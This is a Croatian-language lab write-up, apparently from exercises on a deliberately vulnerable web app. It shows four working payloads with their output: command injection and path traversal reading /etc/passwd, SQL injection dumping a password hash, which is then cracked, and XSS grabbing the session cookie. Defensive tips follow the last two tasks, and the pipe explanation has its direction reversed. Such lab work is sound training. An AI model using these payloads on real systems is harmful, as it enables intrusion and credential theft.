@@ -1,0 +1,80 @@
+1. zadatak
+
+Upisemo naredbu: 1 | cat /etc/passwd
+
+Objasnjenje:
+1 - neki broj kako bi se izvrsila ping naredba
+| - pipe u bash-u, rezultat naredbe koja se nalazi s desne strane | ce se prosljediti naredbi s ljeve strane
+cat /etc/passwd - ispis podataka u datoteci "/etc/passwd"
+
+Sadrzaj datoteke:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+
+
+2. zadatak
+
+Upisemo naredbu: ' UNION SELECT first_name, password FROM users; -- -&Submit=Submit
+
+Objasnjenje: 
+' - zatvaranje unosa
+UNION SELECT first_name, password FROM users; - dohvacanje naziva korisnika i passworda (moramo odabrat dva polja, zbog ispisa imena i prezimena)
+-- -&Submit=Submit - kako bi se ispravno poslala SQL naredba
+
+Hash lozinke: 0d107d09f5bbe40cade3de5c71e9e9b7
+Lozinka: letmein (lozinka je razbijena pomocu: https://crackstation.net)
+
+
+3. zadatak
+
+Upisemo naredbu: <script>alert(document.cookie);</script>
+
+Objasnjenje:
+<script> ... </script> - posto ce javascript automatski izvrsavati onda ce izvrsiti i naredbu koja se nalazi izmedju <script>
+alert(...) - pokaze neki alert
+document.cookie - dohvacanje kolacica
+
+PHPSESSID=tm0p2qnacls51ujn39rncf780e
+
+Kako se zastiti?
+ - Ne ukljucivati ono sto unese korisnik u izlaz aplikacije ili u povratni ispis
+ - Prvo: kodirati sve što unese korisnik i izbjeci znakove <, >, {, } , “ʻ i slicne
+ - Napraviti whitelisting onoga što korisnik može unijeti
+ - Za unos HTML-a treba ga sanitizirati
+ - POST umjesto GET-a
+ - HTTPOnly Cookie-i
+
+4. zadatak
+
+Posaljemo sljedeci GET zahtjev: ?page=/../../../../../../etc/passwd
+
+Objasnjenje: 
+/../../../../../../etc/passwd - "vracamo" se unutar kazala sve do etc i ispisuje se sadrzaj datoteke passwd
+
+Dobiveni ispis:
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+Dobivene su osnovne informacije o korisnicima potrebne za njihovu prijavu, ali ne i njihove sifre
+
+Kako se zastiti?
+ - Pravilno postaviti dozvole (web server nebi niakada trebao imati pristup etc/passwd)
+ - Osigurati da datoteke dolaze iz dozvoljenih direktorija
+ - Sanitizacija unosa
+ - Hardkodiranje popisa dopustenih datoteka
